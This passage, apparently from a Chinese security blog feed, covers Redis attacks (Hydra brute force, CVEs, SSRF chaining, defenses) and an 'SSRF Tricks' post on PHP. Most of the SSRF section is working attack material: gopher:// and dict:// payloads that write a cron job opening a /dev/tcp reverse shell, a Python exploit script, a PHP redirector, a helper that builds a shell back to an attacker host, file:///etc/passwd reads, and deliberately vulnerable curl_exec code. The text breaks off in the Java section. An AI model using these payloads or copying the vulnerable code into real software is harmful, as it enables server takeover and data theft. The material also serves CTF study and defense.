title="用Hydra暴力破解Redis密码"></a>用Hydra暴力破解Redis密码</h3><p>使用Hydra工具可以对Redis密码进行暴力破解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -P /home/fragrant/sec_tools/w3af/w3af/core/controllers/bruteforce/passwords.txt redis://192.168.10.137</span><br></pre></td></tr></table></figure><h3 id="历史CVE漏洞"><a href="#历史CVE漏洞" class="headerlink" title="历史CVE漏洞"></a>历史CVE漏洞</h3><h4 id="Redis远程代码执行漏洞（CVE-2016-8339）"><a href="#Redis远程代码执行漏洞（CVE-2016-8339）" class="headerlink" title="Redis远程代码执行漏洞（CVE-2016-8339）"></a>Redis远程代码执行漏洞（CVE-2016-8339）</h4><p>Redis 3.2.x &lt; 3.2.4 版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，从而RCE。</p><h4 id="CVE-2015-8080"><a href="#CVE-2015-8080" class="headerlink" title="CVE-2015-8080"></a>CVE-2015-8080</h4><p>Redis版本 2.8.x &lt; 2.8.24 和 3.0.x &lt; 3.0.6 中，lua_struct.c中的getnum函数存在整数溢出漏洞，导致攻击者可以运行Lua代码或可能绕过沙盒限制。</p><h4 id="CVE-2015-4335"><a href="#CVE-2015-4335" class="headerlink" title="CVE-2015-4335"></a>CVE-2015-4335</h4><p>Redis 2.8.1 之前版本和 3.0.2 之前版本中存在安全漏洞，攻击者可以远程执行eval命令，利用该漏洞执行任意Lua字节码。</p><h4 id="CVE-2013-7458"><a href="#CVE-2013-7458" class="headerlink" title="CVE-2013-7458"></a>CVE-2013-7458</h4><p>读取”.rediscli_history”配置文件信息。</p><h3 id="不存在NoSQL注入问题？"><a href="#不存在NoSQL注入问题？" class="headerlink" title="不存在NoSQL注入问题？"></a>不存在NoSQL注入问题？</h3><p>目前来说是的。</p><p>Redis客户端在与Redis服务端进行通信时，会使用RESP（REdis Serialization Protocol）协议。Redis客户端对所有的命令进行格式化处理，将不同参数组成的命令转换为符合RESP协议格式的数据，发送给Redis服务端的所有参数都是二进制安全的。</p><p>以下是RESP协议的通用形式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*&lt;number of arguments&gt; CR LF</span><br><span class="line">$&lt;number of bytes of argument 1&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br><span class="line">...</span><br><span class="line">$&lt;number of bytes of argument N&gt; CR LF</span><br><span class="line">&lt;argument data&gt; CR LF</span><br></pre></td></tr></table></figure><p>例子如下，原本命令为<code>SET mykey myvalue</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">SET</span><br><span class="line">$5</span><br><span class="line">mykey</span><br><span class="line">$7</span><br><span class="line">myvalue</span><br></pre></td></tr></table></figure><p>Redis客户端格式化后的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*3\r\n$3\r\nSET\r\n$5\r\nmykey\r\n$7\r\nmyvalue\r\n&quot;</span><br></pre></td></tr></table></figure><p>Redis协议里面没有字符串转义相关的内容，Redis协议使用的是前缀长度的字符串，完全二进制，保证安全性，所以是不存在NoSQL注入的。</p><p>Lua脚本执行EVAL和EVALSHA命令时遵循相同的规则，因此这些命令也是安全的。</p><p>Redis协议规范可参考：<a href="http://www.redis.cn/topics/protocol.html" target="_blank" rel="noopener">http://www.redis.cn/topics/protocol.html</a></p><p>Redis通信过程分析可参考：<a href="https://draveness.me/redis-cli" target="_blank" rel="noopener">https://draveness.me/redis-cli</a></p><h2 id="0x03-漏洞组合拳"><a href="#0x03-漏洞组合拳" class="headerlink" title="0x03 漏洞组合拳"></a>0x03 漏洞组合拳</h2><p>一些比较鸡肋的Web漏洞，在和本地Redis未授权访问漏洞组合进行深入利用后，往往会将危害达到最大化。</p><h3 id="SSRF打本地Redis服务"><a href="#SSRF打本地Redis服务" class="headerlink" title="SSRF打本地Redis服务"></a>SSRF打本地Redis服务</h3><p>前提是Web服务器监听本地的Redis存在未授权访问漏洞，并且Web站点支持Gopher协议。这里就能把范围缩小了，PHP是支持Gopher协议的，而Java不支持。</p><p>具体可参考：<a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a></p><h3 id="Python-urllib-CRLF注入打本地Redis服务"><a href="#Python-urllib-CRLF注入打本地Redis服务" class="headerlink" title="Python urllib CRLF注入打本地Redis服务"></a>Python urllib CRLF注入打本地Redis服务</h3><p>如果目标站点使用了Python漏洞版本的urllib库，并且请求的url外部可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问漏洞的Redis，那么服务器就存在被getshell的风险。</p><p>原理和组合SSRF漏洞完全一样，通过CRLF注入来利用Redis向Crontab写入反弹shell的定时任务。</p><p>具体可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h2><ul><li>禁止公网开放Redis服务，可以在防火墙上禁用6379端口；</li><li>修改Redis服务端口为其他非常见的端口号；</li><li>配置Redis的密码访问验证；</li><li>禁用不使用的高危命令；</li><li>重命名高危命令的名称；</li><li>以低权限运行Redis服务，禁止用root等最高权限运行；</li><li>确保authorized_keys文件的安全，尽量阻止其他用户添加新的公钥；</li></ul><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">记一次Redis+Getshell经验分享</a></p><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/" target="_blank" rel="noopener">Redis 基于主从复制的RCE利用方式</a></p><p><a href="https://zhuanlan.zhihu.com/p/75627194" target="_blank" rel="noopener">redis未授权访问漏洞利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Redis" scheme="https://www.mi1k7ea.com/tags/Redis/"/>
    
  </entry>
  
  <entry>
    <title>SSRF Tricks小结</title>
    <link href="https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks%E5%B0%8F%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2020/02/29/SSRF-Tricks小结/</id>
    <published>2020-02-29T15:53:30.000Z</published>
    <updated>2020-03-08T09:08:08.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>SSRF漏洞原理很简单，这里只整理下SSRF的一些绕过技巧以及在不同语言下的细微差别。</p><h2 id="0x01-SSRF-in-PHP"><a href="#0x01-SSRF-in-PHP" class="headerlink" title="0x01 SSRF in PHP"></a>0x01 SSRF in PHP</h2><h3 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h3><p>在PHP中，涉及到SSRF漏洞的函数有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br></pre></td></tr></table></figure><p>其中有如下几个注意点：</p><ul><li>大部分PHP并不会开启fsockopen()的Gopher Wrapper；</li><li>file_get_contents()的Gopher协议不能进行URLencode；</li><li>file_get_contents()关于Gopher的302跳转有bug，会导致利用失败；</li><li>file_get_contents()支持php://input协议；</li><li>curl/libcurl 7.43版本上Gopher协议存在bug即%00截断，经测试7.49版本可用；</li><li>curl_exec()默认不跟踪跳转；</li></ul><p>curl_exec()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure><p>file_get_contents()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url = $_GET[<span class="string">'url'</span>];;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($url);</span><br></pre></td></tr></table></figure><p>fsockopen()造成的SSRF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span><span class="params">($host,$port,$link)</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, <span class="number">30</span>); </span><br><span class="line">    <span class="keyword">if</span> (!$fp) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"$errstr (error number $errno) \n"</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        $out = <span class="string">"GET $link HTTP/1.1\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Host: $host\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"Connection: Close\r\n\r\n"</span>; </span><br><span class="line">        $out .= <span class="string">"\r\n"</span>; </span><br><span class="line">        fwrite($fp, $out); </span><br><span class="line">        $contents=<span class="string">''</span>; </span><br><span class="line">        <span class="keyword">while</span> (!feof($fp)) </span><br><span class="line">        &#123; </span><br><span class="line">            $contents.= fgets($fp, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        fclose($fp); </span><br><span class="line">        <span class="keyword">return</span> $contents; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="可利用的协议"><a href="#可利用的协议" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>在PHP中能够进行SSRF攻击利用的协议：</p><ul><li>http/https：主要用来探测内网服务，根据响应的状态判断内网端口及服务，可以结合如Struts2的RCE来实现攻击；</li><li>file：读取服务器上的任意文件内容；</li><li>dict：除了泄露安装软件版本信息，还可以查看端口，操作内网Redis服务等；</li><li>gopher：能够将所有操作转换成数据流，并将数据流一次发送出去，可以用来探测内网的所有服务的所有漏洞，可利用来攻击Redis和PHP-FPM；</li><li>ftp/ftps：FTP匿名访问、爆破；</li><li>tftp：UDP协议扩展，发送UDP报文；</li><li>imap/imaps/pop3/smtp/smtps：爆破邮件用户名密码；</li><li>telnet：SSH/Telnet匿名访问及爆破；</li></ul><h3 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h3><p>PHP中的curl_exec()函数导致的SSRF漏洞在CTF中是经常遇到的，该函数会执行cURL会话。</p><p>可以通过<code>curl -V</code>命令查看curl版本及其支持的协议类型：</p><p><img src="/2020/02/29/SSRF-Tricks小结/1.png" alt=""></p><p>可以看到，我本地kali的是支持dict、file、gopher等等协议的。因此本地利用可使用上述几个协议。</p><p>注意：Windows使用curl命令需要把单引号换成双引号。</p><h4 id="file-协议任意读文件"><a href="#file-协议任意读文件" class="headerlink" title="file://协议任意读文件"></a>file://协议任意读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;file:///etc/passwd&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/2.png" alt=""></p><h4 id="dict-协议探测端口及banner信息"><a href="#dict-协议探测端口及banner信息" class="headerlink" title="dict://协议探测端口及banner信息"></a>dict://协议探测端口及banner信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;dict://127.0.0.1:22&apos;</span><br><span class="line">curl -v &apos;dict://127.0.0.1:6379/info&apos;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/3.png" alt=""></p><h4 id="gopher-协议反弹shell"><a href="#gopher-协议反弹shell" class="headerlink" title="gopher://协议反弹shell"></a>gopher://协议反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&apos;</span><br></pre></td></tr></table></figure><p>当需要更换IP和端口时，命令中的<code>$57</code>需要同时更改，因为<code>$57</code>表示的是exp字符串长度为57个字节，上面的exp即<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a</code>这段字符串URL解码后的长度为57。</p><p>这部分在下面的远程利用中会具体讲到。</p><h3 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h3><p>网上找的SSRF题目代码跑下就好。远程利用分为回显型和无回显型。</p><p>s1.php，未做任何SSRF防御，且有回显：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;  </span><br><span class="line">    <span class="comment">// 创建一个新cURL资源</span></span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    <span class="comment">// 设置URL和相应的选项</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 抓取URL并把它传递给浏览器</span></span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用exp，比较简单，就不贴图了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.10.137/s1.php?url=file:///etc/passwd</span><br><span class="line">http://192.168.10.137/s1.php?url=dict://127.0.0.1:6379/info</span><br><span class="line">http://192.168.10.137/s1.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a</span><br><span class="line"></span><br><span class="line"># Windows下file://协议有点区别</span><br><span class="line">http://192.168.10.137/s1.php?url=file:///C:/Windows/win.ini</span><br></pre></td></tr></table></figure><p>s2.php，限制协议为HTTP/HTTPS，且设置跳转重定向为True（默认不跳转）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="keyword">True</span>);</span><br><span class="line">    <span class="comment">// 限制为HTTPS、HTTP协议</span></span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此时使用dict、gopher等协议已经不能像上一个题目一样直接同理，但是还可以利用302跳转的方式来绕过http/https协议限制。</p><h4 id="Redis反弹Shell"><a href="#Redis反弹Shell" class="headerlink" title="Redis反弹Shell"></a>Redis反弹Shell</h4><p>Redis定时任务反弹shell语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n&quot;</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h5 id="通过Gopher协议实现"><a href="#通过Gopher协议实现" class="headerlink" title="通过Gopher协议实现"></a>通过Gopher协议实现</h5><p>Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure><p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，从中进行urlencode编码来构造SSRF攻击代码。</p><p>具体Gopher协议报文的构造可参考Joychou的博客：<a href="https://joychou.org/web/phpssrf.html#directory0418754728965590855" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html#directory0418754728965590855</a></p><h5 id="通过Dict协议实现"><a href="#通过Dict协议实现" class="headerlink" title="通过Dict协议实现"></a>通过Dict协议实现</h5><p>这部分引用自：<a href="http://www.91ri.org/17111.html" target="_blank" rel="noopener">SSRF漏洞分析与利用</a></p><blockquote><p>dict协议有一个功能：dict://serverip:port/name:data 向服务器的端口请求 name data，并在末尾自动补上rn(CRLF)。也就是如果我们发出dict://serverip:port/config:set:dir:/var/spool/cron/的请求，redis就执行了config set dir /var/spool/cron/ rn.用这种方式可以一步步执行redis getshell的exp，执行完就能达到和gopher一样的效果。原理一样，但是gopher只需要一个url请求即可，dict需要步步构造。</p><p>利用猪猪侠的wooyun上公开的脚本改成适配本文的脚本ssrf.py：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">host = <span class="string">'104.224.151.234'</span></span><br><span class="line">port = <span class="string">'6379'</span></span><br><span class="line">bhost = <span class="string">'www.4o4notfound.org'</span></span><br><span class="line">bport=<span class="number">2333</span></span><br><span class="line">vul_httpurl = <span class="string">'http://www.4o4notfound.org/ssrf.php?url='</span></span><br><span class="line">_location = <span class="string">'http://www.4o4notfound.org/302.php'</span></span><br><span class="line">shell_location = <span class="string">'http://www.4o4notfound.org/shell.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1 flush db</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=flushall'</span>.format( host = host,</span><br><span class="line"> port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#set crontab command</span></span><br><span class="line">_payload = <span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26bhost=&#123;bhost&#125;%26bport=</span></span><br><span class="line"><span class="string">&#123;bport&#125;'</span>.format( host = host, port = port, bhost = bhost, bport = bport)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(shell_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri </span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#confg set dir</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dir:/var/spool/cron/'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload, vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#config set dbfilename</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=</span></span><br><span class="line"><span class="string">&#123;port&#125;%26data=config:set:dbfilename:root'</span>.format( host = host, port = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br><span class="line"></span><br><span class="line"><span class="comment">#save</span></span><br><span class="line">_payload=<span class="string">'?s=dict%26ip=&#123;host&#125;%26port=&#123;port&#125;%26data=save'</span>.format( host = host, port</span><br><span class="line"> = port)</span><br><span class="line">exp_uri = <span class="string">'&#123;vul_httpurl&#125;&#123;0&#125;&#123;1&#125;'</span>.format(_location, _payload,</span><br><span class="line"> vul_httpurl=vul_httpurl)</span><br><span class="line"><span class="keyword">print</span> exp_uri</span><br><span class="line"><span class="keyword">print</span> requests.get(exp_uri).content</span><br></pre></td></tr></table></figure><blockquote><p>因为curl默认不支持302跳转，而该脚本要用到302跳转，所以需要在ssrf.php中加上一行“curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1)”来支持跳转。302.php代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$data = $_GET[<span class="string">'data'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/$data"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>shell.php主要用于写入用于反弹shell的crontab的定时任务，代码为：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">$port = $_GET[<span class="string">'port'</span>];</span><br><span class="line">$bhost = $_GET[<span class="string">'bhost'</span>];</span><br><span class="line">$bport = $_GET[<span class="string">'bport'</span>];</span><br><span class="line">$scheme = $_GET[<span class="string">'s'</span>];</span><br><span class="line">header(<span class="string">"Location: $scheme://$ip:$port/set:0:\"\\x0a\\x0a*/1\\x20*\\x20*\\x20*\\x20*\\x20/bin/bash\\x20-</span></span><br><span class="line"><span class="string">i\\x20&amp;gt;\\x26\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\x200&amp;gt;\\x261\\x0a\\x0a\\x0a\""</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>执行ssrf.py,即可在/var/spool/cron/下写入定时任务，反弹shell，nc等待接收shell。</p></blockquote><h4 id="攻击本地PHP-FPM"><a href="#攻击本地PHP-FPM" class="headerlink" title="攻击本地PHP-FPM"></a>攻击本地PHP-FPM</h4><p>SSRF打本地PHP-FPM在之前的博文中有讲过：<a href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/#0x05-SSRF%E6%94%BB%E5%87%BB%E6%9C%AC%E5%9C%B0PHP-FPM">《浅谈PHP-FPM安全》</a></p><p>本次的Gopher协议攻击报文是直接通过脚本生成的。</p><h2 id="0x02-SSRF-in-Java"><a href="#0x02-SSRF-in-Java" class="headerlink" title="0x02 SSRF in Java"></a>0x02 SSRF in Java</h2><h3 id="可利用的协议-1"><a href="#可利用的协议-1" class="headerlink" title="可利用的协议"></a>可利用的协议</h3><p>由于Java没有PHP的cURL，因此不能像PHP一样可以通过<code>curl -V</code>来查看支持的协议，这里我们可以使用<code>import sun.net.www.protocol</code>来查看支持哪些协议：</p><p><img src="/2020/02/29/SSRF-Tricks小结/4.png" 